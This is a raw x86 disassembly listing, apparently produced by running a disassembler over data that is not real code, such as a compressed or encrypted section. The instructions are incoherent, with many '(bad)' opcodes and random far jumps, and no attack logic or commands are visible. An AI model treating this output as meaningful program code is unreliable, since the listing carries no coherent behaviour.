  42d30a:	pop    ss
  42d30b:	sub    BYTE PTR [ebp+0x18],ch
  42d30e:	push   ebp
  42d30f:	aaa    
  42d310:	mov    al,BYTE PTR [eax-0x24]
  42d313:	sub    ebp,DWORD PTR [edi-0x5]
  42d316:	ja     0x42d395
  42d318:	into   
  42d319:	out    dx,al
  42d31a:	aam    0xb0
  42d31c:	mov    gs,esi
  42d31e:	pop    esi
  42d31f:	hlt    
  42d320:	sub    eax,0x1eeea6d6
  42d325:	mov    edi,0xc24e8fa0
  42d32a:	jmp    0x42d2e6
  42d32c:	outs   dx,DWORD PTR ds:[esi]
  42d32d:	repnz pop ebx
  42d32f:	pop    es
  42d330:	push   esi
  42d331:	mov    dl,0x22
  42d333:	jmp    0xd236205
  42d338:	loop   0x42d3b0
  42d33a:	and    al,0xc4
  42d33c:	iret   
  42d33d:	sbb    al,0xdd
  42d33f:	sbb    ah,ch
  42d341:	les    esi,FWORD PTR [edx]
  42d343:	push   eax
  42d344:	(bad)  
  42d345:	cmp    al,0xbb
  42d347:	(bad)  
  42d349:	push   eax
  42d34a:	dec    ecx
  42d34b:	xchg   ebx,esp
  42d34d:	sbb    bl,BYTE PTR [eax-0x6e]
  42d350:	out    dx,al
  42d351:	xor    BYTE PTR [edi+0x220cdc02],bh
  42d357:	adc    al,0xe7
  42d359:	rcl    ebx,cl
  42d35b:	or     al,0x7c
  42d35d:	push   esi
  42d35e:	retf   0xeeaf
  42d361:	dec    ebp
  42d362:	xchg   BYTE PTR [esi],dl
  42d364:	scas   al,BYTE PTR es:[edi]
  42d365:	push   eax
  42d366:	dec    ebx
  42d367:	dec    esp
  42d368:	mov    BYTE PTR [edi],bh
  42d36a:	add    esp,ebp
  42d36c:	or     ebp,edi
  42d36e:	push   ds
  42d36f:	leave  
  42d370:	jg     0x42d32a
  42d372:	inc    ecx
  42d373:	dec    edi
  42d374:	loopne 0x42d38e
  42d376:	js     0x42d32f
  42d378:	pop    edi
  42d379:	scas   al,BYTE PTR es:[edi]
  42d37a:	xor    al,0x24
  42d37c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d37d:	push   ds
  42d37e:	lds    esi,FWORD PTR [esi-0x69fd3879]
  42d384:	enter  0x5960,0xb1
  42d388:	(bad)  
  42d389:	pushf  
  42d38a:	dec    esp
  42d38b:	in     eax,dx
  42d38c:	ret    
  42d38d:	out    dx,al
  42d38e:	das    
  42d38f:	pop    eax
  42d390:	add    al,0x1f
  42d392:	sub    al,0x94
  42d394:	and    ah,bh
  42d396:	ins    DWORD PTR es:[edi],dx
  42d397:	add    al,0x17
  42d399:	sub    dh,BYTE PTR [ebx+0x66]
  42d39c:	cmp    al,0x6f
  42d39e:	push   edi
  42d39f:	and    DWORD PTR [esi-0x11],edx
  42d3a2:	fwait
  42d3a3:	fwait
  42d3a4:	cmp    ebx,ebp
  42d3a6:	test   al,0x66
  42d3a8:	in     eax,dx
  42d3a9:	and    bh,dl
  42d3ab:	cld    
  42d3ac:	xor    esi,esp
  42d3ae:	jb     0x42d3b2
  42d3b0:	sub    esp,DWORD PTR [esi-0x21b58baf]
  42d3b6:	cmc    
  42d3b7:	sub    edi,DWORD PTR [edi+0x525155ee]
  42d3bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d3be:	add    ebp,eax
  42d3c0:	cmp    BYTE PTR ds:0x0,bl
	...
  42d432:	add    BYTE PTR [eax],al
  42d434:	in     al,dx
  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0xf0a20781
  42d442:	jmp    0x42d464
  42d444:	fild   WORD PTR fs:[ecx]
  42d447:	add    dh,dh
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    BYTE PTR [ebp+0x4f],bh
  42d44e:	dec    ecx
  42d44f:	adc    eax,0x47eb23a1
  42d454:	and    esi,DWORD PTR [ebp-0x11]
  42d457:	xor    eax,0x82a11013
  42d45c:	repz test DWORD PTR [ebx+esi*1-0x11],ebp
  42d461:	dec    DWORD PTR [ecx+0x7bf85f2a]
  42d467:	shr    DWORD PTR [edi+edi*8-0x181e30da],cl
  42d46e:	frstor [esi-0x59]
  42d471:	out    dx,eax
  42d472:	ja     0x42d4dc
  42d474:	icebp  
  42d475:	or     al,0xe
  42d477:	lods   eax,DWORD PTR ds:[esi]
  42d478:	cmc    
  42d479:	push   0x566c43b9
  42d47e:	mov    edi,0x1affdd36
  42d483:	push   0x3b
  42d485:	pop    ds
  42d486:	sar    DWORD PTR [ebx-0x20],1
  42d489:	dec    ebx
  42d48a:	sti    
  42d48b:	inc    ecx
  42d48c:	cmp    ecx,ebp
  42d48e:	dec    edi
  42d48f:	leave  
  42d490:	add    al,BYTE PTR [ebp+ecx*4+0x2e888395]
  42d497:	sub    eax,0xfd36d842
  42d49c:	xor    al,0xe2
  42d49e:	(bad)  
  42d4a0:	test   eax,0x9f85671f
  42d4a5:	out    0x6d,eax
  42d4a7:	addr16 daa 
  42d4a9:	pop    ebp
  42d4aa:	add    BYTE PTR [esi-0x71],bl
  42d4ad:	mov    dl,0x84
  42d4af:	xchg   edi,eax
  42d4b0:	mov    ecx,0x29dc4eff
  42d4b5:	stc    
  42d4b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d4b7:	pop    eax
  42d4b8:	cmp    BYTE PTR [esi+esi*4-0x74],bl
  42d4bc:	mov    ah,0x2d
  42d4be:	push   ebx
  42d4bf:	(bad)  
  42d4c0:	jmp    0xb43e4a73
  42d4c5:	and    DWORD PTR [edx],0xffffffe2
  42d4c8:	addr16 dec ebp
  42d4ca:	push   es
  42d4cb:	popf   
  42d4cc:	ror    esp,1
  42d4ce:	addr16 jbe 0x42d4a3
  42d4d1:	cmp    al,BYTE PTR [esi+0x448bc964]
  42d4d7:	neg    DWORD PTR [eax-0x4930a001]
  42d4dd:	dec    edi
  42d4de:	fbld   TBYTE PTR [ebp+ecx*2-0x6b]
  42d4e2:	(bad)  
  42d4e3:	push   ecx
  42d4e4:	push   edi
  42d4e5:	sbb    BYTE PTR [eax-0x22],dl
  42d4e8:	(bad)  
  42d4e9:	jo     0x42d508
  42d4eb:	rcr    DWORD PTR [esi],cl
  42d4ed:	sub    esp,DWORD PTR [edi-0x590a6c44]
  42d4f3:	pop    ss
  42d4f4:	adc    bl,al
  42d4f6:	and    al,0xf0
  42d4f8:	call   0xf91e:0xce5625f8
  42d4ff:	push   es
  42d500:	retf   0x537f
  42d503:	ret    0x8f1d
  42d506:	or     BYTE PTR [edi-0x75678fb],bh
  42d50c:	sahf   
  42d50d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d50e:	or     eax,0xc5f7515
  42d513:	call   0x33c9:0xd61c68b9
  42d51a:	ds clc 
  42d51c:	retf   
  42d51d:	jne    0x42d599
  42d51f:	inc    eax
  42d520:	mov    ds:0x5620cef1,al
  42d525:	out    0xd4,al
  42d527:	shl    BYTE PTR [esi+0x38a563d2],cl
  42d52d:	ret    0x4999
  42d530:	push   edi
  42d531:	xchg   ebp,eax
  42d532:	scas   eax,DWORD PTR es:[edi]
  42d533:	inc    ebp
  42d534:	leave  
  42d535:	lea    eax,[ebp+0x40]
  42d538:	int    0x38
  42d53a:	rol    DWORD PTR [esi],0x65
  42d53d:	adc    DWORD PTR [ebx-0x6e],esp
  42d540:	and    ah,0x0
	...
  42d5b3:	add    BYTE PTR [ebp+0x48],bl
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	jge    0x42d627
  42d5c2:	js     0x42d576
  42d5c4:	pop    edx
  42d5c5:	loopne 0x42d5c8
  42d5c7:	add    dh,dh
  42d5c9:	add    BYTE PTR [eax],al
  42d5cb:	add    BYTE PTR [edi+0x58383bad],al
  42d5d1:	repz fbstp TBYTE PTR [ebp-0x51538d8d]
  42d5d8:	push   esi
  42d5da:	inc    edi
  42d5db:	cmp    dh,al
  42d5dd:	inc    ecx
  42d5de:	dec    eax
  42d5df:	test   eax,0x2a6749a9
  42d5e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5e5:	xor    al,0xc0
  42d5e7:	sbb    ebp,DWORD PTR [ebx-0x54]
  42d5ea:	sti    
  42d5eb:	mov    dl,0xbd
  42d5ed:	push   esp
  42d5ee:	in     al,0x29
  42d5f0:	not    DWORD PTR ds:0xd2bdb159
  42d5f6:	fs inc ecx
  42d5f8:	arpl   WORD PTR [ecx-0x61],bp
  42d5fb:	mov    esp,0xbe0b92bd
  42d600:	and    eax,0xaa325605
  42d605:	add    cl,0xfa
  42d608:	and    BYTE PTR [esi-0x2e],al
  42d60b:	dec    ebp
  42d60c:	dec    ebx
  42d60d:	sbb    bl,BYTE PTR [ecx+0x6b]
  42d610:	push   0xffffffc2
  42d612:	jle    0x42d625
  42d614:	stos   DWORD PTR es:[edi],eax
  42d615:	cmp    eax,DWORD PTR [edx+ebp*2-0x7d]
  42d619:	mov    ds:0x2fc4d0ea,eax
  42d61e:	sbb    BYTE PTR [ecx+0x3d],al
  42d621:	stc    
  42d622:	std    
  42d623:	pop    edi
  42d624:	(bad)  
  42d625:	in     eax,dx
  42d626:	sub    ebx,ecx
  42d628:	imul   BYTE PTR [edx+0x48]
  42d62b:	hlt    
  42d62c:	fld    DWORD PTR [ebp-0x33f5e0d1]
  42d632:	lods   eax,DWORD PTR ds:[esi]
  42d633:	and    ch,bh
  42d635:	jle    0x42d6a0
  42d637:	mov    dh,0xab
  42d639:	in     eax,dx
  42d63a:	(bad)  
  42d63b:	push   eax
  42d63c:	sbb    ah,bh
  42d63e:	in     al,dx
  42d63f:	mov    ebp,0xc059a63
  42d644:	mov    DWORD PTR [ecx],0xdefc24ad
  42d64a:	xor    DWORD PTR [eax],ebx
  42d64c:	pop    ss
  42d64d:	mov    ebx,0x30acd80b
  42d652:	or     edi,ebp
  42d654:	adc    dl,0xa
  42d657:	cmp    al,0xe9
  42d659:	adc    DWORD PTR [ebp+0x69ee2f7c],esi
  42d65f:	shr    BYTE PTR [ebp-0x1ff8f37],0x39
  42d666:	add    DWORD PTR [edi+ebp*1],esi
  42d669:	jno    0x42d632
  42d66b:	shl    BYTE PTR [ebp-0x75],1
  42d66e:	fst    DWORD PTR [ebx+eax*4+0x5a]
  42d672:	jmp    DWORD PTR [ecx-0x4f]
  42d675:	or     bh,dh
  42d677:	mov    ebp,gs
  42d679:	js     0x42d612
  42d67b:	pcmpeqd mm2,QWORD PTR [esi-0x80]
  42d67f:	hlt    
  42d680:	or     bh,BYTE PTR [ebx+0x21]
  42d683:	gs cmp al,0x3
  42d686:	cmp    BYTE PTR [edi],dh
  42d688:	(bad)  
  42d689:	lds    esp,FWORD PTR [eax]
  42d68b:	mov    ecx,0x22204716
  42d690:	xor    dh,BYTE PTR es:[edi-0x2e5912bb]
  42d697:	add    BYTE PTR [ebp-0x1b749468],cl
  42d69d:	pop    esp
  42d69e:	icebp  
  42d69f:	push   edi
  42d6a0:	jmp    0xfcd2f243
  42d6a5:	stos   DWORD PTR es:[edi],eax
  42d6a6:	pop    ss
  42d6a7:	cmc    
  42d6a8:	pop    esp
  42d6a9:	fnstenv [edi-0xb45d5eb]
  42d6af:	cwde   
  42d6b0:	xor    eax,0x63f3eb7
  42d6b5:	js     0x42d723
  42d6b7:	cli    
  42d6b8:	jo     0x42d657
  42d6ba:	dec    eax
  42d6bb:	push   ebx
  42d6bc:	lock das 
  42d6be:	jmp    0x0:0xcd518d
	...
  42d731:	add    BYTE PTR [eax],al
  42d733:	add    BYTE PTR [eax],bh
  42d735:	mov    DWORD PTR [edx-0x6b],ebp
  42d738:	sti    
  42d739:	idiv   edi
  42d73b:	lods   eax,DWORD PTR ds:[esi]
  42d73c:	jne    0x42d70c
  42d73e:	adc    al,0x87
  42d740:	pop    edi
  42d741:	push   ebx
  42d742:	daa    
  42d743:	rcl    DWORD PTR [eax-0x1f],cl
  42d746:	add    DWORD PTR [eax],eax
  42d748:	test   BYTE PTR [eax],0x0
  42d74b:	add    al,ch
  42d74d:	or     esp,DWORD PTR [edi+ecx*1+0x485a5147]
  42d754:	(bad)  
  42d755:	and    esi,edx
  42d757:	adc    edx,DWORD PTR [edx+0x2f]
  42d75a:	fdiv   DWORD PTR [edi]
  42d75c:	push   edx
  42d75d:	jecxz  0x42d75f
  42d75f:	adc    eax,0x95a3ec92
  42d764:	int3   
  42d765:	xor    ebx,eax
  42d767:	sub    al,0xcd
  42d769:	mov    BYTE PTR [edi+0x35d9030f],cl
  42d76f:	ja     0x42d762
  42d771:	pop    ebp
  42d772:	cwde   
  42d773:	add    ecx,DWORD PTR [edi-0x77947e42]
  42d779:	and    al,BYTE PTR [ebx]
  42d77b:	pop    ebx
  42d77c:	rol    BYTE PTR [edx-0x3b747998],1
  42d782:	push   cs
  42d783:	gs (bad) 
  42d786:	aad    0xc8
  42d788:	dec    edi
  42d789:	in     al,dx
  42d78a:	stos   BYTE PTR es:[edi],al
  42d78b:	mov    ds:0xfd251acb,al
  42d790:	or     BYTE PTR ds:0xaf851c7b,al
  42d796:	iret   
  42d797:	sbb    eax,DWORD PTR [ebp+0x53]
  42d79a:	mov    cl,BYTE PTR [eax+0x40d82baa]
  42d7a0:	adc    DWORD PTR [ecx-0x569140b],edx
  42d7a6:	pop    esp
  42d7a7:	lahf   
  42d7a8:	jecxz  0x42d7eb
  42d7aa:	lods   al,BYTE PTR fs:[esi]
  42d7ac:	mov    cl,0xbc
  42d7ae:	imul   ecx,DWORD PTR [edi-0x36],0x2bd47427
  42d7b5:	or     DWORD PTR [ecx],ebx
  42d7b7:	dec    esi
  42d7b8:	int    0x2d
  42d7ba:	cld    
  42d7bb:	mov    dl,0xe9
  42d7bd:	and    esi,ebp
  42d7bf:	cmp    al,dl
  42d7c1:	pushf  
  42d7c2:	xor    esi,DWORD PTR [eax+0x1]
  42d7c5:	xor    DWORD PTR [edi-0x7ae7b0a1],ecx
  42d7cb:	mov    ch,0x3c
  42d7cd:	rcl    DWORD PTR [edi],0x4c
  42d7d0:	sbb    BYTE PTR [edi-0x53053ada],ah
  42d7d6:	add    BYTE PTR [ebx-0x41ae4d4a],dl
  42d7dc:	mov    ds,eax
  42d7de:	lahf   
  42d7df:	inc    eax
  42d7e1:	cli    
  42d7e2:	es aaa 
  42d7e4:	cmp    ax,0xa0a0
  42d7e8:	je     0x42d856
  42d7ea:	ror    ch,cl
  42d7ec:	clc    
  42d7ed:	rcr    BYTE PTR [ebp+0x7c4e253e],1
  42d7f3:	cwde   
  42d7f4:	jnp    0x42d81c
  42d7f6:	xor    al,0x18
  42d7f8:	lods   al,BYTE PTR ds:[esi]
  42d7f9:	sbb    edi,edi
  42d7fb:	sub    BYTE PTR [ebx-0x66],ah
  42d7fe:	dec    edi
  42d7ff:	icebp  
  42d800:	out    dx,eax
  42d801:	int    0x98
  42d803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d804:	xchg   edi,eax
  42d805:	or     BYTE PTR [ebx-0x74],bl
  42d808:	jno    0x42d84a
  42d80a:	and    BYTE PTR [ecx],ah
  42d80c:	(bad)  
  42d80d:	retf   
  42d80e:	pop    edi
  42d80f:	sub    cl,bh
  42d811:	add    eax,0x8d2ea198
  42d816:	dec    esi
  42d817:	push   0xcb02b74a
  42d81c:	xor    BYTE PTR [edx],al
  42d81e:	mov    dh,0xb2
  42d820:	in     al,dx
  42d821:	scas   al,BYTE PTR es:[edi]
  42d822:	sbb    al,0x71
  42d824:	ins    BYTE PTR es:[edi],dx
  42d825:	fst    QWORD PTR [esi+esi*1]
  42d828:	aas    
  42d829:	sub    DWORD PTR [ebp-0x2e],0xbb2ea52
  42d830:	ins    BYTE PTR es:[edi],dx
  42d831:	mov    ch,0x32
  42d833:	popa   
  42d834:	jno    0x42d7e6
  42d836:	pop    esi
  42d837:	cwde   
  42d838:	adc    BYTE PTR [edi+ebx*4+0x72e5db04],al
  42d83f:	add    esp,DWORD PTR [eax]
  42d841:	aam    0x0
	...
  42d8b3:	add    BYTE PTR [eax],dl
  42d8b5:	sbb    ecx,ecx
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0xc8dcc254
  42d8c1:	and    al,0x23
  42d8c3:	or     al,0x46
  42d8c5:	loop   0x42d8c8
  42d8c7:	add    dh,dh
  42d8c9:	add    BYTE PTR [eax],al
  42d8cb:	add    BYTE PTR [eax],dl
  42d8cd:	dec    ecx
  42d8ce:	cwde   
  42d8cf:	mov    ds:0xfbde258,al
  42d8d4:	ret    0xcb1e
  42d8d7:	imul   edx,eax,0x67
  42d8da:	sub    al,0x1e
  42d8dc:	jb     0x42d8a7
  42d8de:	mov    ah,bl
  42d8e0:	pop    ss
  42d8e1:	and    eax,DWORD PTR [edi-0x4fe21317]
  42d8e7:	inc    ebx
  42d8e8:	jmp    0x25e4ebcf
  42d8ed:	ja     0x42d874
  42d8ef:	dec    ebp
  42d8f0:	xchg   esi,eax
  42d8f1:	in     al,dx
  42d8f2:	dec    esi
  42d8f3:	xor    ch,BYTE PTR [edx-0x326ac208]
  42d8f9:	xor    ecx,eax
  42d8fb:	cld    
  42d8fc:	sbb    al,0x67
  42d8fe:	push   ds
  42d8ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d900:	xchg   ebp,eax
  42d901:	sub    BYTE PTR [ecx],bl
  42d903:	call   0xf4dae11d
  42d908:	add    eax,0x641f26ef
  42d90d:	(bad)  
  42d90e:	mov    eax,0xc23cb016
  42d913:	mov    ch,BYTE PTR [ebx+ebp*2+0x774721d5]
  42d91a:	xor    DWORD PTR [esi],eax
  42d91c:	fsub   DWORD PTR [ebx+0x4fdc973]
  42d922:	push   edi
  42d923:	push   es
  42d924:	xor    al,0xde
  42d926:	and    DWORD PTR [edx-0x1],0x75
  42d92a:	std    
  42d92b:	jmp    0xab94dafd
  42d930:	call   0xb3434c40
  42d935:	lahf   
  42d936:	inc    esp
  42d937:	popf   
  42d938:	xor    ecx,DWORD PTR [edi]
  42d93a:	lea    ebp,[esi]
  42d93c:	aad    0xab
  42d93e:	sub    al,0x5a
  42d940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d941:	xor    DWORD PTR ss:[ebp+0xa],ebp
  42d945:	mov    ebx,0xa9da7979
  42d94a:	inc    ecx
  42d94b:	test   DWORD PTR [ecx+0x0],esi
  42d94e:	or     al,0x90
  42d950:	jns    0x42d956
  42d952:	shl    DWORD PTR [edx-0x73],cl
  42d955:	out    0x9f,al
  42d957:	scas   al,BYTE PTR es:[edi]
  42d958:	ins    BYTE PTR es:[edi],dx
  42d959:	jge    0x42d985
  42d95b:	xchg   esp,eax
  42d95c:	or     ebx,edx
  42d95e:	fadd   QWORD PTR [ebx+0x4b]
  42d961:	call   0x9663:0x3bd48969
  42d968:	mov    al,ds:0xbee6b2ec
  42d96d:	lea    ebx,[ecx+ebp*4-0x9]
  42d971:	int3   
  42d972:	outs   dx,BYTE PTR ds:[esi]
  42d973:	mov    bl,BYTE PTR [edx-0x1a6a2d03]
  42d979:	and    eax,0xfa18107d
  42d97e:	iret   
  42d97f:	sbb    BYTE PTR [edi-0x19],0xfe
  42d983:	out    0x43,al
  42d985:	sti    
  42d986:	mov    cl,0xd9
  42d988:	cmp    dl,BYTE PTR [esi]
  42d98a:	mov    dl,0x4d
  42d98c:	test   al,0x4b
  42d98e:	sub    ch,BYTE PTR [eax+0x71153948]
  42d994:	sbb    BYTE PTR [ebp+esi*4-0x16],ah
  42d998:	adc    al,dl
  42d99a:	stos   BYTE PTR es:[edi],al
  42d99b:	jb     0x42d931
  42d99d:	aaa    
  42d99e:	out    0x5b,al
  42d9a0:	cmp    esi,DWORD PTR [esi-0x13b7c9ad]
  42d9a6:	push   ss
  42d9a7:	lods   eax,DWORD PTR ds:[esi]
  42d9a8:	cmc    
  42d9a9:	pop    esi
  42d9aa:	in     eax,dx
  42d9ab:	jle    0x42d95d
  42d9ad:	adc    BYTE PTR [edi-0x41],bh
  42d9b0:	repz jp 0x42da20
  42d9b3:	mov    eax,ds:0xf8d54acc
  42d9b8:	mov    cl,0xc7
  42d9ba:	xor    edx,DWORD PTR [edx]
  42d9bc:	ins    BYTE PTR es:[edi],dx
  42d9bd:	dec    BYTE PTR [ebx+0x8e9e1f]
	...
  42da33:	add    BYTE PTR [edi-0x2be7726],ah
  42da39:	push   ebx
  42da3a:	out    dx,eax
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	pop    DWORD PTR [eax+0x3cf2ae5a]
  42da45:	jecxz  0x42da48
  42da47:	add    dh,dh
  42da49:	add    BYTE PTR [eax],al
  42da4b:	add    BYTE PTR [esi-0x77],al
  42da4e:	push   es
  42da4f:	dec    edx
  42da50:	mov    ecx,0x58f0a37f
  42da55:	cmc    
  42da56:	xchg   esi,eax
  42da57:	cmp    eax,0x276445b0
  42da5c:	(bad)  
  42da5d:	jno    0x42da46
  42da5f:	or     BYTE PTR [esi-0x112a4575],al
  42da65:	js     0x42da38
  42da67:	mov    ds:0x9a4f3e0c,al
  42da6c:	jl     0x42da62
  42da6e:	in     eax,dx
  42da6f:	loope  0x42da99
  42da71:	test   al,0xf9
  42da73:	cmc    
  42da74:	adc    BYTE PTR [esi+0x5e],0x7f
  42da78:	out    0x22,eax
  42da7a:	sbb    DWORD PTR [ebx],edx
  42da7c:	mov    esi,DWORD PTR [esi]
  42da7e:	mov    ch,0x4
  42da80:	aaa    
  42da81:	jle    0x42da15
  42da83:	add    al,0xbd
  42da85:	cld    
  42da86:	cmp    dh,BYTE PTR [edi+0x6306a072]
  42da8c:	mov    ah,0xc1
  42da8e:	(bad)  
  42da8f:	(bad)  
  42da90:	mov    ah,0xad
  42da92:	jecxz  0x42da30
  42da94:	jno    0x42db08
  42da96:	sbb    DWORD PTR [ebx],ecx
  42da98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da99:	icebp  
  42da9a:	loop   0x42db07
  42da9c:	add    eax,0xd5a85bbd
  42daa1:	pop    ebp
  42daa2:	mov    eax,ds:0x21f41f56
  42daa7:	or     edi,DWORD PTR [eax]
  42daa9:	fld    st(0)
  42daab:	lea    ebx,[edi-0x45f29a03]
  42dab1:	stos   DWORD PTR es:[edi],eax
  42dab2:	adc    BYTE PTR [ebp+edi*8+0x4686d176],cl
  42dab9:	and    BYTE PTR es:[ebp-0x53],bl
  42dabd:	inc    ecx
  42dabe:	xor    eax,0xedb5aa
  42dac3:	mov    eax,0xb08d7832
  42dac8:	cld    
  42dac9:	clc    
  42daca:	repz data16 xor bh,BYTE PTR [esi+0x39e62bea]
  42dad2:	adc    al,BYTE PTR [ecx]
  42dad4:	int    0x4d
  42dad6:	fcomi  st,st(6)
  42dad8:	data16 arpl WORD PTR [eax],sp
  42dadb:	push   0x3c41ee57
  42dae0:	mov    ah,0x2e
  42dae2:	xchg   edx,eax
  42dae4:	jg     0x42dac0
  42dae6:	pop    ds
  42dae7:	shl    DWORD PTR [esi-0x298e02b9],0x47
  42daee:	test   BYTE PTR [edi+0x3e],bh
  42daf1:	ds inc edx
  42daf3:	push   ss
  42daf4:	jb     0x42da94
  42daf6:	cs enter 0xbbd0,0x4e
  42dafb:	add    eax,0x614bc88a
  42db00:	pop    edi
  42db01:	fsincos 
  42db03:	mov    fs,esp
  42db05:	mov    edx,0x79ff464d
  42db0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db0b:	stos   DWORD PTR es:[edi],eax
  42db0c:	sub    bh,ch
  42db0e:	ds inc esp
  42db10:	stos   DWORD PTR es:[edi],eax
  42db11:	push   es
  42db12:	pushf  
  42db13:	test   DWORD PTR ds:0x3e49881d,ebp
  42db19:	mov    esi,0x991c8afd
  42db1e:	dec    eax
  42db1f:	lods   eax,DWORD PTR ds:[esi]
  42db20:	in     al,dx
  42db21:	cmp    al,0x82
  42db23:	push   cs
  42db24:	inc    esi
  42db25:	(bad)  
  42db27:	xor    bl,BYTE PTR [edi-0x46]
  42db2a:	arpl   WORD PTR [edx-0x1659f23e],bp
  42db30:	pop    eax
  42db31:	sub    eax,0x8e3d1e98
  42db36:	xchg   cx,ax
  42db38:	push   edx
  42db39:	and    DWORD PTR [esi],0x6d
  42db3c:	mov    al,ds:0x1abbdef
  42db41:	cmp    eax,0x0
	...
  42dbb2:	add    BYTE PTR [eax],al
  42dbb4:	jg     0x42dbb8
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0xd5746337,al
  42dbc3:	je     0x42dbf7
  42dbc5:	in     al,0x1
  42dbc7:	add    dh,dh
  42dbc9:	add    BYTE PTR [eax],al
  42dbcb:	add    BYTE PTR [esi],cl
  42dbcd:	dec    esp
  42dbce:	and    DWORD PTR [edi+0x2f45dc00],0xbc94f259
  42dbd8:	call   0xf9e2b4de
  42dbdd:	or     cl,cl
  42dbdf:	div    DWORD PTR [edi+0x69]
  42dbe2:	fwait
  42dbe3:	jl     0x42dbbb
  42dbe5:	pop    ds
  42dbe6:	lods   eax,DWORD PTR ds:[esi]
  42dbe7:	add    DWORD PTR [edx+0x15],0xd94cf7d
  42dbee:	retf   0x1fa1
  42dbf1:	xor    DWORD PTR [ebx+esi*8],ebp
  42dbf4:	pop    ss
  42dbf5:	ja     0x42dc59
  42dbf7:	and    al,BYTE PTR [edx+0xecde9e7]
  42dbfd:	mov    esi,0x1dc7ffbc
  42dc02:	lea    eax,[eax+0xf22264d]
  42dc08:	scas   eax,DWORD PTR es:[edi]
  42dc09:	push   esi
  42dc0a:	mov    ebp,0x41aa6a2c
  42dc0f:	sbb    DWORD PTR [ebx-0x61],edi
  42dc12:	push   ebp
  42dc13:	scas   al,BYTE PTR es:[edi]
  42dc14:	jbe    0x42dc6c
  42dc16:	aas    
  42dc17:	xchg   esi,eax
  42dc18:	stc    
  42dc19:	mov    ebp,0xc022369c
  42dc1e:	sbb    dl,BYTE PTR [bp+si-0x64e3]
  42dc23:	mov    edi,edi
  42dc25:	daa    
  42dc26:	pop    es
  42dc27:	jbe    0x42dbbc
  42dc29:	das    
  42dc2a:	and    DWORD PTR [ebx-0x35],edi
  42dc2d:	pusha  
  42dc2e:	(bad)  
  42dc2f:	call   0xaeaf:0x9bc2d9cd
  42dc36:	out    dx,eax
  42dc37:	ret    
  42dc38:	jecxz  0x42dbd5
  42dc3a:	stos   BYTE PTR es:[edi],al
  42dc3b:	inc    edi
  42dc3c:	out    0x52,eax
  42dc3e:	inc    esi
  42dc3f:	xor    bh,BYTE PTR [esp+edx*2+0x7e]
  42dc43:	mov    ax,ax
  42dc46:	(bad)  
  42dc47:	cwde   
  42dc48:	int    0xa8
  42dc4a:	fnstenv [edi]
  42dc4c:	jg     0x42dc54
  42dc4e:	sbb    eax,DWORD PTR [edi]
  42dc50:	and    eax,0x513ffbcd
  42dc55:	push   DWORD PTR [ebx-0x6a]
  42dc58:	ret    
  42dc59:	dec    esp
  42dc5a:	scas   al,BYTE PTR es:[edi]
  42dc5b:	fcomp  QWORD PTR [edx-0x505970ac]
  42dc61:	mov    bl,0x1a
  42dc63:	and    edx,DWORD PTR [esp+ecx*1-0x2c138133]
  42dc6a:	jmp    0x42dc29
  42dc6c:	in     al,dx
  42dc6d:	icebp  
  42dc6e:	inc    edi
  42dc6f:	xchg   ebx,eax
  42dc70:	dec    edi
  42dc71:	pop    esi
  42dc72:	and    edi,DWORD PTR [ecx-0x10]
  42dc75:	xor    ecx,ebx
  42dc77:	push   0xf62c9527
  42dc7c:	sti    
  42dc7d:	jbe    0x42dc75
  42dc7f:	ins    BYTE PTR es:[edi],dx
  42dc80:	sahf   
  42dc81:	mov    cl,0x4c
  42dc83:	js     0x42dcc5
  42dc85:	(bad)  
  42dc86:	push   ss
  42dc87:	rcl    BYTE PTR [esi+ecx*1],0x3b
  42dc8b:	mov    ?,WORD PTR [ebp*1-0x169b5818]
  42dc92:	or     BYTE PTR [ebx],bh
  42dc94:	jne    0x42dce1
  42dc96:	adc    ch,BYTE PTR [ebp+0x26f808dd]
  42dc9c:	aaa    
  42dc9d:	cmp    BYTE PTR [edi+0x74],al
  42dca0:	dec    esi
  42dca1:	int3   
  42dca2:	rcr    DWORD PTR [ebx+0x5b602e6c],1
  42dca8:	xchg   ebp,eax
  42dca9:	adc    DWORD PTR [ecx-0x469ad94c],esi
  42dcaf:	jge    0x42dd02
  42dcb1:	xchg   ecx,eax
  42dcb2:	dec    esi
  42dcb3:	pop    ds
  42dcb4:	outs   dx,DWORD PTR ds:[esi]
  42dcb5:	fbstp  TBYTE PTR [esi+esi*8-0x61]
  42dcb9:	std    
  42dcba:	sti    
  42dcbb:	aaa    
  42dcbc:	fwait
  42dcbd:	pop    ss
  42dcbe:	adc    DWORD PTR [edi-0x13],esp
  42dcc1:	inc    esi
	...
  42dd32:	add    BYTE PTR [eax],al
  42dd34:	sbb    DWORD PTR [ecx-0x20017802],esp
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx+0x5d60ef8]
  42dd44:	sub    ch,ah
  42dd46:	add    DWORD PTR [eax],eax
  42dd48:	test   BYTE PTR [eax],0x0
  42dd4b:	add    dh,bh
  42dd4d:	out    0x7,al
  42dd4f:	shr    DWORD PTR [eax-0x1e],cl
  42dd52:	jmp    0x23f0:0x225d8c41
  42dd59:	and    ah,BYTE PTR [edi]
